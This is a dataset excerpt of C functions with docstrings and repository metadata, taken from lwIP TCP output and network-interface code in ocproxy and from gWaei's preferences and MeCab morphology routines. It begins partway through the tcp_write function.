seglen bytes. We\n       * can use PBUF_RAW here since the data appears in the middle of\n       * a segment. A header will never be prepended. */\n      if (apiflags & TCP_WRITE_FLAG_COPY) {\n        /* Data is copied */\n        if ((concat_p = tcp_pbuf_prealloc(PBUF_RAW, seglen, space, &oversize, pcb, apiflags, 1)) == NULL) {\n          LWIP_DEBUGF(TCP_OUTPUT_DEBUG | 2,\n                      (\"tcp_write : could not allocate memory for pbuf copy size %\"U16_F\"\\n\",\n                       seglen));\n          goto memerr;\n        }\n#if TCP_OVERSIZE_DBGCHECK\n        last_unsent->oversize_left += oversize;\n#endif /* TCP_OVERSIZE_DBGCHECK */\n        TCP_DATA_COPY2(concat_p->payload, (u8_t*)arg + pos, seglen, &concat_chksum, &concat_chksum_swapped);\n#if TCP_CHECKSUM_ON_COPY\n        concat_chksummed += seglen;\n#endif /* TCP_CHECKSUM_ON_COPY */\n      } else {\n        /* Data is not copied */\n        if ((concat_p = pbuf_alloc(PBUF_RAW, seglen, PBUF_ROM)) == NULL) {\n          LWIP_DEBUGF(TCP_OUTPUT_DEBUG | 2,\n                      (\"tcp_write: could not allocate memory for zero-copy pbuf\\n\"));\n          goto memerr;\n        }\n#if TCP_CHECKSUM_ON_COPY\n        /* calculate the checksum of nocopy-data */\n        tcp_seg_add_chksum(~inet_chksum((u8_t*)arg + pos, seglen), seglen,\n          &concat_chksum, &concat_chksum_swapped);\n        concat_chksummed += seglen;\n#endif /* TCP_CHECKSUM_ON_COPY */\n        /* reference the non-volatile payload data */\n        concat_p->payload = (u8_t*)arg + pos;\n      }\n\n      pos += seglen;\n      queuelen += pbuf_clen(concat_p);\n    }\n  } else {\n#if TCP_OVERSIZE\n    LWIP_ASSERT(\"unsent_oversize mismatch (pcb->unsent is NULL)\",\n                pcb->unsent_oversize == 0);\n#endif /* TCP_OVERSIZE */\n  }\n\n  /*\n   * Phase 3: Create new segments.\n   *\n   * The new segments are chained together in the local 'queue'\n   * variable, ready to be appended to pcb->unsent.\n   */\n  while (pos < len) {\n    struct pbuf *p;\n    u16_t left = len - pos;\n    u16_t max_len = mss_local - optlen;\n    u16_t seglen = left > max_len ? max_len : left;\n#if TCP_CHECKSUM_ON_COPY\n    u16_t chksum = 0;\n    u8_t chksum_swapped = 0;\n#endif /* TCP_CHECKSUM_ON_COPY */\n\n    if (apiflags & TCP_WRITE_FLAG_COPY) {\n      /* If copy is set, memory should be allocated and data copied\n       * into pbuf */\n      if ((p = tcp_pbuf_prealloc(PBUF_TRANSPORT, seglen + optlen, mss_local, &oversize, pcb, apiflags, queue == NULL)) == NULL) {\n        LWIP_DEBUGF(TCP_OUTPUT_DEBUG | 2, (\"tcp_write : could not allocate memory for pbuf copy size %\"U16_F\"\\n\", seglen));\n        goto memerr;\n      }\n      LWIP_ASSERT(\"tcp_write: check that first pbuf can hold the complete seglen\",\n                  (p->len >= seglen));\n      TCP_DATA_COPY2((char *)p->payload + optlen, (u8_t*)arg + pos, seglen, &chksum, &chksum_swapped);\n    } else {\n      /* Copy is not set: First allocate a pbuf for holding the data.\n       * Since the referenced data is available at least until it is\n       * sent out on the link (as it has to be ACKed by the remote\n       * party) we can safely use PBUF_ROM instead of PBUF_REF here.\n       */\n      struct pbuf *p2;\n#if TCP_OVERSIZE\n      LWIP_ASSERT(\"oversize == 0\", oversize == 0);\n#endif /* TCP_OVERSIZE */\n      if ((p2 = pbuf_alloc(PBUF_TRANSPORT, seglen, PBUF_ROM)) == NULL) {\n        LWIP_DEBUGF(TCP_OUTPUT_DEBUG | 2, (\"tcp_write: could not allocate memory for zero-copy pbuf\\n\"));\n        goto memerr;\n      }\n#if TCP_CHECKSUM_ON_COPY\n      /* calculate the checksum of nocopy-data */\n      chksum = ~inet_chksum((u8_t*)arg + pos, seglen);\n#endif /* TCP_CHECKSUM_ON_COPY */\n      /* reference the non-volatile payload data */\n      p2->payload = (u8_t*)arg + pos;\n\n      /* Second, allocate a pbuf for the headers. */\n      if ((p = pbuf_alloc(PBUF_TRANSPORT, optlen, PBUF_RAM)) == NULL) {\n        /* If allocation fails, we have to deallocate the data pbuf as\n         * well. */\n        pbuf_free(p2);\n        LWIP_DEBUGF(TCP_OUTPUT_DEBUG | 2, (\"tcp_write: could not allocate memory for header pbuf\\n\"));\n        goto memerr;\n      }\n      /* Concatenate the headers and data pbufs together. */\n      pbuf_cat(p/*header*/, p2/*data*/);\n    }\n\n    queuelen += pbuf_clen(p);\n\n    /* Now that there are more segments queued, we check again if the\n     * length of the queue exceeds the configured maximum or\n     * overflows. */\n    if ((queuelen > TCP_SND_QUEUELEN) || (queuelen > TCP_SNDQUEUELEN_OVERFLOW)) {\n      LWIP_DEBUGF(TCP_OUTPUT_DEBUG | 2, (\"tcp_write: queue too long %\"TCPWNDSIZE_F\" (%\"TCPWNDSIZE_F\")\\n\", queuelen, TCP_SND_QUEUELEN));\n      pbuf_free(p);\n      goto memerr;\n    }\n\n    if ((seg = tcp_create_segment(pcb, p, 0, pcb->snd_lbb + pos, optflags)) == NULL) {\n      goto memerr;\n    }\n#if TCP_OVERSIZE_DBGCHECK\n    seg->oversize_left = oversize;\n#endif /* TCP_OVERSIZE_DBGCHECK */\n#if TCP_CHECKSUM_ON_COPY\n    seg->chksum = chksum;\n    seg->chksum_swapped = chksum_swapped;\n    seg->flags |= TF_SEG_DATA_CHECKSUMMED;\n#endif /* TCP_CHECKSUM_ON_COPY */\n\n    /* first segment of to-be-queued data? */\n    if (queue == NULL) {\n      queue = seg;\n    } else {\n      /* Attach the segment to the end of the queued segments */\n      LWIP_ASSERT(\"prev_seg != NULL\", prev_seg != NULL);\n      prev_seg->next = seg;\n    }\n    /* remember last segment of to-be-queued data for next iteration */\n    prev_seg = seg;\n\n    LWIP_DEBUGF(TCP_OUTPUT_DEBUG | LWIP_DBG_TRACE, (\"tcp_write: queueing %\"U32_F\":%\"U32_F\"\\n\",\n      ntohl(seg->tcphdr->seqno),\n      ntohl(seg->tcphdr->seqno) + TCP_TCPLEN(seg)));\n\n    pos += seglen;\n  }\n\n  /*\n   * All three segmentation phases were successful. We can commit the\n   * transaction.\n   */\n\n  /*\n   * Phase 1: If data has been added to the preallocated tail of\n   * last_unsent, we update the length fields of the pbuf chain.\n   */\n#if TCP_OVERSIZE\n  if (oversize_used > 0) {\n    struct pbuf *p;\n    /* Bump tot_len of whole chain, len of tail */\n    for (p = last_unsent->p; p; p = p->next) {\n      p->tot_len += oversize_used;\n      if (p->next == NULL) {\n        TCP_DATA_COPY((char *)p->payload + p->len, arg, oversize_used, last_unsent);\n        p->len += oversize_used;\n      }\n    }\n    last_unsent->len += oversize_used;\n#if TCP_OVERSIZE_DBGCHECK\n    LWIP_ASSERT(\"last_unsent->oversize_left >= oversize_used\",\n                last_unsent->oversize_left >= oversize_used);\n    last_unsent->oversize_left -= oversize_used;\n#endif /* TCP_OVERSIZE_DBGCHECK */\n  }\n  pcb->unsent_oversize = oversize;\n#endif /* TCP_OVERSIZE */\n\n  /*\n   * Phase 2: concat_p can be concatenated onto last_unsent->p\n   */\n  if (concat_p != NULL) {\n    LWIP_ASSERT(\"tcp_write: cannot concatenate when pcb->unsent is empty\",\n      (last_unsent != NULL));\n    pbuf_cat(last_unsent->p, concat_p);\n    last_unsent->len += concat_p->tot_len;\n#if TCP_CHECKSUM_ON_COPY\n    if (concat_chksummed) {\n      /*if concat checksumm swapped - swap it back */\n      if (concat_chksum_swapped){\n        concat_chksum = SWAP_BYTES_IN_WORD(concat_chksum);\n      }\n      tcp_seg_add_chksum(concat_chksum, concat_chksummed, &last_unsent->chksum,\n        &last_unsent->chksum_swapped);\n      last_unsent->flags |= TF_SEG_DATA_CHECKSUMMED;\n    }\n#endif /* TCP_CHECKSUM_ON_COPY */\n  }\n\n  /*\n   * Phase 3: Append queue to pcb->unsent. Queue may be NULL, but that\n   * is harmless\n   */\n  if (last_unsent == NULL) {\n    pcb->unsent = queue;\n  } else {\n    last_unsent->next = queue;\n  }\n\n  /*\n   * Finally update the pcb state.\n   */\n  pcb->snd_lbb += len;\n  pcb->snd_buf -= len;\n  pcb->snd_queuelen = queuelen;\n\n  LWIP_DEBUGF(TCP_QLEN_DEBUG, (\"tcp_write: %\"S16_F\" (after enqueued)\\n\",\n    pcb->snd_queuelen));\n  if (pcb->snd_queuelen != 0) {\n    LWIP_ASSERT(\"tcp_write: valid queue length\",\n                pcb->unacked != NULL || pcb->unsent != NULL);\n  }\n\n  /* Set the PSH flag in the last segment that we enqueued. */\n  if (seg != NULL && seg->tcphdr != NULL && ((apiflags & TCP_WRITE_FLAG_MORE)==0)) {\n    TCPH_SET_FLAG(seg->tcphdr, TCP_PSH);\n  }\n\n  return ERR_OK;\nmemerr:\n  pcb->flags |= TF_NAGLEMEMERR;\n  TCP_STATS_INC(tcp.memerr);\n\n  if (concat_p != NULL) {\n    pbuf_free(concat_p);\n  }\n  if (queue != NULL) {\n    tcp_segs_free(queue);\n  }\n  if (pcb->snd_queuelen != 0) {\n    LWIP_ASSERT(\"tcp_write: valid queue length\", pcb->unacked != NULL ||\n      pcb->unsent != NULL);\n  }\n  LWIP_DEBUGF(TCP_QLEN_DEBUG | LWIP_DBG_STATE, (\"tcp_write: %\"S16_F\" (with mem err)\\n\", pcb->snd_queuelen));\n  return ERR_MEM;\n}", "path": "lwip\\src\\core\\tcp_out.c", "repo_name": "cernekee/ocproxy", "stars": 331, "license": "other", "language": "c", "size": 1906}
{"docstring": "/*-----------------------------------------------------------------------------------*/\n", "func_signal": "static int\nsioslipif_output(struct netif *netif, struct pbuf *p, struct ip_addr *ipaddr)", "code": "{\n  struct pbuf *q;\n  int i;\n  u8_t c;\n  \n  /* Send pbuf out on the serial I/O device. */\n  sio_send(SLIP_END);\n  \n  for(q = p; q != NULL; q = q->next) {\n    for(i = 0; i < q->len; i++) {\n      c = ((u8_t *)q->payload)[i];\n      switch (c) {\n      case SLIP_END:\n        sio_send(SLIP_ESC);\n        sio_send(SLIP_ESC_END);\n        break;\n      case SLIP_ESC:\n        sio_send(SLIP_ESC);\n        sio_send(SLIP_ESC_ESC);\n        break;\n      default:\n        sio_send(c);\n        break;\n      }\n    }\n  }\n  sio_send(SLIP_END);\n  return 0;\n}", "path": "contrib\\ports\\old\\rtxc\\netif\\sioslipif.c", "repo_name": "cernekee/ocproxy", "stars": 331, "license": "other", "language": "c", "size": 1906}
{"docstring": "/*-----------------------------------------------------------------------------------*/\n", "func_signal": "static void\nsioslipif_loop(void)", "code": "{\n  struct pbuf *p;\n  struct netif *netif;\n\n  netif = netif_pass;\n  while (1) {\n    p = sioslipif_input();    \n    netif->input(p, netif);\n  }\n}", "path": "contrib\\ports\\old\\rtxc\\netif\\sioslipif.c", "repo_name": "cernekee/ocproxy", "stars": 331, "license": "other", "language": "c", "size": 1906}
{"docstring": "/**\n * Send keepalive packets to keep a connection active although\n * no data is sent over it.\n *\n * Called by tcp_slowtmr()\n *\n * @param pcb the tcp_pcb for which to send a keepalive packet\n */\n", "func_signal": "void\ntcp_keepalive(struct tcp_pcb *pcb)", "code": "{\n  struct pbuf *p;\n#if CHECKSUM_GEN_TCP\n  struct tcp_hdr *tcphdr;\n#endif /* CHECKSUM_GEN_TCP */\n\n  LWIP_DEBUGF(TCP_DEBUG, (\"tcp_keepalive: sending KEEPALIVE probe to \"));\n  ipX_addr_debug_print(PCB_ISIPV6(pcb), TCP_DEBUG, &pcb->remote_ip);\n  LWIP_DEBUGF(TCP_DEBUG, (\"\\n\"));\n\n  LWIP_DEBUGF(TCP_DEBUG, (\"tcp_keepalive: tcp_ticks %\"U32_F\"   pcb->tmr %\"U32_F\" pcb->keep_cnt_sent %\"U16_F\"\\n\", \n                          tcp_ticks, pcb->tmr, pcb->keep_cnt_sent));\n   \n  p = tcp_output_alloc_header(pcb, 0, 0, htonl(pcb->snd_nxt - 1));\n  if(p == NULL) {\n    LWIP_DEBUGF(TCP_DEBUG, \n                (\"tcp_keepalive: could not allocate memory for pbuf\\n\"));\n    return;\n  }\n#if CHECKSUM_GEN_TCP\n  tcphdr = (struct tcp_hdr *)p->payload;\n\n  tcphdr->chksum = ipX_chksum_pseudo(PCB_ISIPV6(pcb), p, IP_PROTO_TCP, p->tot_len,\n      &pcb->local_ip, &pcb->remote_ip);\n#endif /* CHECKSUM_GEN_TCP */\n  TCP_STATS_INC(tcp.xmit);\n\n  /* Send output to IP */\n#if LWIP_NETIF_HWADDRHINT\n  ipX_output_hinted(PCB_ISIPV6(pcb), p, &pcb->local_ip, &pcb->remote_ip,\n    pcb->ttl, 0, IP_PROTO_TCP, &pcb->addr_hint);\n#else /* LWIP_NETIF_HWADDRHINT*/\n  ipX_output(PCB_ISIPV6(pcb), p, &pcb->local_ip, &pcb->remote_ip, pcb->ttl,\n    0, IP_PROTO_TCP);\n#endif /* LWIP_NETIF_HWADDRHINT*/\n\n  pbuf_free(p);\n\n  LWIP_DEBUGF(TCP_DEBUG, (\"tcp_keepalive: seqno %\"U32_F\" ackno %\"U32_F\".\\n\",\n                          pcb->snd_nxt - 1, pcb->rcv_nxt));\n}", "path": "lwip\\src\\core\\tcp_out.c", "repo_name": "cernekee/ocproxy", "stars": 331, "license": "other", "language": "c", "size": 1906}
{"docstring": "/**\n * Handle retransmission after three dupacks received\n *\n * @param pcb the tcp_pcb for which to retransmit the first unacked segment\n */\n", "func_signal": "void \ntcp_rexmit_fast(struct tcp_pcb *pcb)", "code": "{\n  if (pcb->unacked != NULL && !(pcb->flags & TF_INFR)) {\n    /* This is fast retransmit. Retransmit the first unacked segment. */\n    LWIP_DEBUGF(TCP_FR_DEBUG, \n                (\"tcp_receive: dupacks %\"U16_F\" (%\"U32_F\n                 \"), fast retransmit %\"U32_F\"\\n\",\n                 (u16_t)pcb->dupacks, pcb->lastack,\n                 ntohl(pcb->unacked->tcphdr->seqno)));\n    tcp_rexmit(pcb);\n\n    /* Set ssthresh to half of the minimum of the current\n     * cwnd and the advertised window */\n    if (pcb->cwnd > pcb->snd_wnd) {\n      pcb->ssthresh = pcb->snd_wnd / 2;\n    } else {\n      pcb->ssthresh = pcb->cwnd / 2;\n    }\n    \n    /* The minimum value for ssthresh should be 2 MSS */\n    if (pcb->ssthresh < (2U * pcb->mss)) {\n      LWIP_DEBUGF(TCP_FR_DEBUG, \n                  (\"tcp_receive: The minimum value for ssthresh %\"U16_F\n                   \" should be min 2 mss %\"U16_F\"...\\n\",\n                   pcb->ssthresh, 2*pcb->mss));\n      pcb->ssthresh = 2*pcb->mss;\n    }\n    \n    pcb->cwnd = pcb->ssthresh + 3 * pcb->mss;\n    pcb->flags |= TF_INFR;\n  } \n}", "path": "lwip\\src\\core\\tcp_out.c", "repo_name": "cernekee/ocproxy", "stars": 331, "license": "other", "language": "c", "size": 1906}
{"docstring": "/**\n * Requeue all unacked segments for retransmission\n *\n * Called by tcp_slowtmr() for slow retransmission.\n *\n * @param pcb the tcp_pcb for which to re-enqueue all unacked segments\n */\n", "func_signal": "void\ntcp_rexmit_rto(struct tcp_pcb *pcb)", "code": "{\n  struct tcp_seg *seg;\n\n  if (pcb->unacked == NULL) {\n    return;\n  }\n\n  /* Move all unacked segments to the head of the unsent queue */\n  for (seg = pcb->unacked; seg->next != NULL; seg = seg->next);\n  /* concatenate unsent queue after unacked queue */\n  seg->next = pcb->unsent;\n#if TCP_OVERSIZE && TCP_OVERSIZE_DBGCHECK\n  /* if last unsent changed, we need to update unsent_oversize */\n  if (pcb->unsent == NULL) {\n    pcb->unsent_oversize = seg->oversize_left;\n  }\n#endif /* TCP_OVERSIZE && TCP_OVERSIZE_DBGCHECK*/\n  /* unsent queue is the concatenated queue (of unacked, unsent) */\n  pcb->unsent = pcb->unacked;\n  /* unacked queue is now empty */\n  pcb->unacked = NULL;\n\n  /* increment number of retransmissions */\n  ++pcb->nrtx;\n\n  /* Don't take any RTT measurements after retransmitting. */\n  pcb->rttest = 0;\n\n  /* Do the actual retransmission */\n  tcp_output(pcb);\n}", "path": "lwip\\src\\core\\tcp_out.c", "repo_name": "cernekee/ocproxy", "stars": 331, "license": "other", "language": "c", "size": 1906}
{"docstring": "/*-----------------------------------------------------------------------------------*/\n/*\n * low_level_input():\n *\n * Should allocate a pbuf and transfer the bytes of the incoming\n * packet from the interface into the pbuf.\n *\n */\n/*-----------------------------------------------------------------------------------*/\n", "func_signal": "static struct pbuf *\nlow_level_input(struct netif *netif)", "code": "{\n  struct pbuf *p, *q;\n  u16_t len;\n  char buf[1514];\n  char *bufptr;\n  struct mintapif *mintapif;\n\n  mintapif = (struct mintapif *)netif->state;\n\n  /* Obtain the size of the packet and put it into the \"len\"\n     variable. */\n  len = read(mintapif->fd, buf, sizeof(buf));\n  snmp_add_ifinoctets(netif,len);\n\n  /*  if (((double)rand()/(double)RAND_MAX) < 0.1) {\n    printf(\"drop\\n\");\n    return NULL;\n    }*/\n  \n  /* We allocate a pbuf chain of pbufs from the pool. */\n  p = pbuf_alloc(PBUF_LINK, len, PBUF_POOL);\n  \n  if (p != NULL) {\n    /* We iterate over the pbuf chain until we have read the entire\n       packet into the pbuf. */\n    bufptr = &buf[0];\n    for(q = p; q != NULL; q = q->next) {\n      /* Read enough bytes to fill this pbuf in the chain. The\n         available data in the pbuf is given by the q->len\n         variable. */\n      /* read data into(q->payload, q->len); */\n      memcpy(q->payload, bufptr, q->len);\n      bufptr += q->len;\n    }\n    /* acknowledge that packet has been read(); */\n  } else {\n    /* drop packet(); */\n    snmp_inc_ifindiscards(netif);\n    printf(\"Could not allocate pbufs\\n\");\n  }\n\n  return p;  \n}", "path": "contrib\\ports\\unix\\proj\\minimal\\mintapif.c", "repo_name": "cernekee/ocproxy", "stars": 331, "license": "other", "language": "c", "size": 1906}
{"docstring": "/**\n * Called by tcp_close() to send a segment including FIN flag but not data.\n *\n * @param pcb the tcp_pcb over which to send a segment\n * @return ERR_OK if sent, another err_t otherwise\n */\n", "func_signal": "err_t\ntcp_send_fin(struct tcp_pcb *pcb)", "code": "{\n  /* first, try to add the fin to the last unsent segment */\n  if (pcb->unsent != NULL) {\n    struct tcp_seg *last_unsent;\n    for (last_unsent = pcb->unsent; last_unsent->next != NULL;\n         last_unsent = last_unsent->next);\n\n    if ((TCPH_FLAGS(last_unsent->tcphdr) & (TCP_SYN | TCP_FIN | TCP_RST)) == 0) {\n      /* no SYN/FIN/RST flag in the header, we can add the FIN flag */\n      TCPH_SET_FLAG(last_unsent->tcphdr, TCP_FIN);\n      pcb->flags |= TF_FIN;\n      return ERR_OK;\n    }\n  }\n  /* no data, no length, flags, copy=1, no optdata */\n  return tcp_enqueue_flags(pcb, TCP_FIN);\n}", "path": "lwip\\src\\core\\tcp_out.c", "repo_name": "cernekee/ocproxy", "stars": 331, "license": "other", "language": "c", "size": 1906}
{"docstring": "//!\n//! @brief Allocates a new empty LwMorphology object.\n//!\n", "func_signal": "static LwMorphology*\nlw_morphology_new ()", "code": "{\n    LwMorphology *morphology;\n    morphology = g_new0 (LwMorphology, 1);\n    return morphology;\n}", "path": "src\\libwaei\\morphology.c", "repo_name": "norbusan/debian-gwaei", "stars": 430, "license": "gpl-3.0", "language": "c", "size": 1955}
{"docstring": "//!\n//! @brief Sets the boolean to the key in the preferences backend\n//! @param preferences The LwPreferences to fetch the GSettings object matching the schema\n//! @param schema The schema to look for\n//! @param key The key to use to look up the pref inside of the schema\n//! @param request The value to set\n//!\n", "func_signal": "void \nlw_preferences_set_boolean_by_schema (LwPreferences* preferences, const char* schema, const char *key, const gboolean request)", "code": "{\n    GSettings* settings;\n    \n    settings = lw_preferences_get_settings_object (preferences, schema);\n\n    if (settings != NULL)\n    {\n      lw_preferences_set_boolean (settings, key, request);\n    }\n}", "path": "src\\libwaei\\preferences.c", "repo_name": "norbusan/debian-gwaei", "stars": 430, "license": "gpl-3.0", "language": "c", "size": 1955}
{"docstring": "//!\n//! @brief Returns an integer from the preference backend \n//! @param preferences The LwPreferences to fetch the GSettings object matching the schema\n//! @param schema The key to use to look up the pref\n//! @param key The key to use to look up the pref\n//!\n", "func_signal": "int \nlw_preferences_get_int_by_schema (LwPreferences* preferences, const char* schema, const char *key)", "code": "{\n    GSettings* settings;\n    int value;\n    \n    value = 0;\n    settings = lw_preferences_get_settings_object (preferences, schema);\n\n    if (settings != NULL)\n    {\n      value = lw_preferences_get_int (settings, key);\n    }\n\n    return value;\n}", "path": "src\\libwaei\\preferences.c", "repo_name": "norbusan/debian-gwaei", "stars": 430, "license": "gpl-3.0", "language": "c", "size": 1955}
{"docstring": "//!\n//! @brief Morphological analysis of input using Mecab\n//!\n", "func_signal": "GList*\nlw_morphologyengine_analyze (LwMorphologyEngine *engine, const gchar *INPUT_RAW)", "code": "{\n    if (engine == NULL) return NULL;\n    g_return_val_if_fail (INPUT_RAW != NULL, NULL);\n\n    const mecab_node_t *node;\n    gchar **fields = NULL, *surface = NULL;\n    gchar *temp;\n    gchar *input = NULL;\n    LwMorphology *morphology = NULL;\n    GList *list = NULL;\n\n    g_mutex_lock (&engine->mutex);\n\n    input = lw_morphologyengine_encode_to_mecab (engine, INPUT_RAW, -1);\n    if (!input)\n      goto fail;\n    node = mecab_sparse_tonode(engine->mecab, input);\n\n#define FLUSH_ITEM                                                                            \\\n        do {                                                                                  \\\n            if (morphology->explanation && !g_str_has_prefix(morphology->explanation, morphology->base_form)) { \\\n                temp = g_strdup_printf(\"%s(%s)\", morphology->explanation, morphology->base_form);         \\\n                g_free(morphology->explanation);                                                    \\\n                morphology->explanation = temp;                                                     \\\n            }                                                                                 \\\n            list = g_list_prepend(list, morphology);                              \\\n            morphology = NULL;                                                                      \\\n        } while (0)\n\n    for (; node; node = node->next) {\n      gchar *base_form, *word_class;\n      gchar *p;\n      gboolean start_word = FALSE;\n\n      if (node->stat != MECAB_NOR_NODE) {\n        continue;\n      }\n\n      // Parse input\n      p = lw_morphologyengine_decode_from_mecab (engine, node->feature, -1);\n      if (!p)\n        goto fail;\n      fields = g_strsplit(p, \",\", -1);\n      g_free(p);\n\n      if (g_strv_length(fields) < 7) {\n        goto fail;\n      }\n\n      surface = lw_morphologyengine_decode_from_mecab (engine, node->surface, node->length);\n      word_class = fields[0];\n      base_form = fields[6];\n\n      p = g_strrstr(base_form, \":\");\n      if (p) {\n        base_form = p+1;\n      }\n      if (g_str_has_suffix(base_form, PLAIN_COPULA) &&\n        !g_str_has_suffix(surface, PLAIN_COPULA)) {\n        // Mecab may add the copula to adjectives -- strip it\n        base_form[strlen(base_form) - 3] = '\\0';\n      }\n\n      // Check whether to start a new word here\n      start_word = TRUE;\n      if (g_str_has_prefix(word_class, ID_SUFFIX) ||\n            g_str_has_prefix(word_class, ID_AUX_VERB)) {\n        // Skip suffixes & aux. verbs\n        start_word = FALSE;\n      }\n      if (g_str_has_prefix(word_class, ID_POSTPOSITION) &&\n            g_utf8_strlen(surface, -1) == 1) {\n        // Skip single-letter postpositions (NO, TE, etc.)\n        start_word = FALSE;\n      }\n      if (base_form[0] == '*' || base_form[0] == '\\0') {\n        // Start a word only if there is some base form listed\n        start_word = FALSE;\n      }\n\n      // Process input\n      if (start_word) {\n          if (morphology) {\n            FLUSH_ITEM;\n          }\n        morphology = lw_morphology_new ();\n        morphology->word = g_strdup (surface);\n        morphology->base_form = g_strdup (base_form);\n        morphology->explanation = NULL;\n      }\n      else {\n        if (morphology) {\n          temp = g_strconcat (morphology->word, surface, NULL);\n          g_free (morphology->word);\n          morphology->word = temp;\n        }\n      }\n\n      // Construct explanation\n      if (morphology) {\n        if (morphology->explanation == NULL) {\n          morphology->explanation = g_strdup (surface);\n        }\n        else {\n          temp = g_strdup_printf (\"%s-%s\", morphology->explanation, surface);\n          g_free (morphology->explanation);\n          morphology->explanation = temp;\n        }\n      }\n\n      g_strfreev (fields);\n      g_free (surface);\n      fields = NULL;\n      surface = NULL;\n    }\n\n    if (morphology) {\n      FLUSH_ITEM;\n    }\n\n    g_free(input);\n\n    g_mutex_unlock (&engine->mutex);\n\n    list = g_list_reverse (list);\n\n    return list;\n\nfail:\n    g_mutex_unlock (&engine->mutex);\n\n    if (morphology != NULL) lw_morphology_free (morphology);\n    if (fields != NULL) g_strfreev (fields);\n    if (surface != NULL) g_free (surface);\n    if (input != NULL) g_free (input);\n\n    return list;\n}", "path": "src\\libwaei\\morphology.c", "repo_name": "norbusan/debian-gwaei", "stars": 430, "license": "gpl-3.0", "language": "c", "size": 1955}
{"docstring": "//!\n//! @brief Creates a new LwDictInfo object\n//! @return An allocated LwDictInfo that will be needed to be freed by lw_preferences_free.\n//!\n", "func_signal": "LwPreferences* \nlw_preferences_new (GSettingsBackend *backend)", "code": "{\n  LwPreferences *temp;\n\n  temp = (LwPreferences*) malloc(sizeof(LwPreferences));\n\n  if (temp != NULL)\n  {\n    lw_preferences_init (temp, backend);\n  }\n\n  return temp;\n}", "path": "src\\libwaei\\preferences.c", "repo_name": "norbusan/debian-gwaei", "stars": 430, "license": "gpl-3.0", "language": "c", "size": 1955}
{"docstring": "//!\n//! @brief Convert string from UTF-8 to Mecab's charset.\n//!\n", "func_signal": "static gchar*\nlw_morphologyengine_encode_to_mecab (LwMorphologyEngine *engine, const gchar *WORD, gint nbytes)", "code": "{\n    const mecab_dictionary_info_t *info = mecab_dictionary_info (engine->mecab);\n    gsize bytes_read, bytes_written;\n    return g_convert (WORD, nbytes, info->charset, \"UTF-8\", &bytes_read, &bytes_written, NULL);\n}", "path": "src\\libwaei\\morphology.c", "repo_name": "norbusan/debian-gwaei", "stars": 430, "license": "gpl-3.0", "language": "c", "size": 1955}
{"docstring": "//!\n//! @brief Adds a preference change listener for the selected key\n//! @param settings The GSettings object to act on You will have to get it yourself using lw_preferences_get_settings_object\n//! @param key The preference key\n//! @param callback_function The function to call when the key changes\n//! @param data The userdata to pass to the callback function\n//! @returns A gulong used to remove a signal later if desired\n//!\n", "func_signal": "gulong \nlw_preferences_add_change_listener (GSettings *settings, const char *key, void (*callback_function) (GSettings*, gchar*, gpointer), gpointer data)", "code": "{\n    g_assert (key != NULL);\n\n    //Declarations\n    char *signal_name;\n    gulong id;\n    GVariant *value;\n\n    //Set up the signal\n    signal_name = g_strdup_printf (\"changed::%s\", key);\n    id = g_signal_connect (G_OBJECT (settings), signal_name, G_CALLBACK (callback_function), data);\n\n    //Trigger an initial fire of the change listener\n    value = g_settings_get_value (settings, key);\n    if (value != NULL) g_settings_set_value (settings, key, value);\n\n    //Cleanup\n    g_variant_unref (value);\n    value = NULL;\n    g_free (signal_name);\n    signal_name = NULL;\n\n    return id;\n}", "path": "src\\libwaei\\preferences.c", "repo_name": "norbusan/debian-gwaei", "stars": 430, "license": "gpl-3.0", "language": "c", "size": 1955}
{"docstring": "//!\n//! @brief Fetches a gsettings object by id, and stores it, using the cached one if available\n//!\n", "func_signal": "GSettings* \nlw_preferences_get_settings_object (LwPreferences *preferences, const char *SCHEMA)", "code": "{\n    //Declarations\n    GList *iter;\n    char *schema;\n    GSettings *settings;\n\n    //Initializations\n    settings = NULL;\n\n    //Look for an already created gsetting object\n    for (iter = preferences->settingslist; iter != NULL; iter = iter->next)\n    {\n      settings = (GSettings*) iter->data;\n      g_object_get (G_OBJECT (settings), \"schema\", &schema, NULL);\n      if (schema != NULL && strcmp(schema, SCHEMA) == 0)\n        break;\n      if (schema != NULL)\n        g_free (schema);\n      settings = NULL;\n    }\n    if (settings != NULL) \n    {\n      g_free (schema);\n    }\n    else\n    {\n    }\n\n    //If not found, create our own and add it to the list\n    if (settings == NULL)\n    {\n      g_assert (lw_preferences_schema_is_installed (SCHEMA));\n\n      if (preferences->backend == NULL)\n        settings = g_settings_new (SCHEMA);\n      else\n        settings = g_settings_new_with_backend (SCHEMA, preferences->backend);\n      if (settings != NULL)\n      {\n        preferences->settingslist = g_list_append (preferences->settingslist, settings);\n      }\n    }\n\n    return settings;\n}", "path": "src\\libwaei\\preferences.c", "repo_name": "norbusan/debian-gwaei", "stars": 430, "license": "gpl-3.0", "language": "c", "size": 1955}
{"docstring": "//!\n//! @brief Frees an allocated LwMorphology object.\n//!\n", "func_signal": "static void \nlw_morphology_free (LwMorphology *morphology)", "code": "{\n    if (morphology->word != NULL)\n      g_free (morphology->word); morphology->word = NULL;\n    if (morphology->base_form != NULL)\n      g_free (morphology->base_form); morphology->base_form = NULL;\n    if (morphology->explanation != NULL)\n      g_free (morphology->explanation); morphology->explanation = NULL;\n    free(morphology);\n}", "path": "src\\libwaei\\morphology.c", "repo_name": "norbusan/debian-gwaei", "stars": 430, "license": "gpl-3.0", "language": "c", "size": 1955}
{"docstring": "//!\n//! @brief Frees the GSettings objects held by LwPreferences\n//! @param preferences The instance of LwPreferences to free\n//!\n", "func_signal": "void \nlw_preferences_free_settings (LwPreferences *preferences)", "code": "{\n    GList *iter;\n    GSettings *settings;\n\n    for (iter = preferences->settingslist; iter != NULL; iter = iter->next)\n    {\n      settings = (GSettings*) iter->data;\n      g_object_unref (settings);\n      iter->data = NULL;\n    }\n\n    g_list_free (preferences->settingslist);\n    preferences->settingslist = NULL;\n\n    if (preferences->backend != NULL)\n    {\n      g_object_unref (preferences->backend);\n      preferences->backend = NULL;\n    }\n}", "path": "src\\libwaei\\preferences.c", "repo_name": "norbusan/debian-gwaei", "stars": 430, "license": "gpl-3.0", "language": "c", "size": 1955}
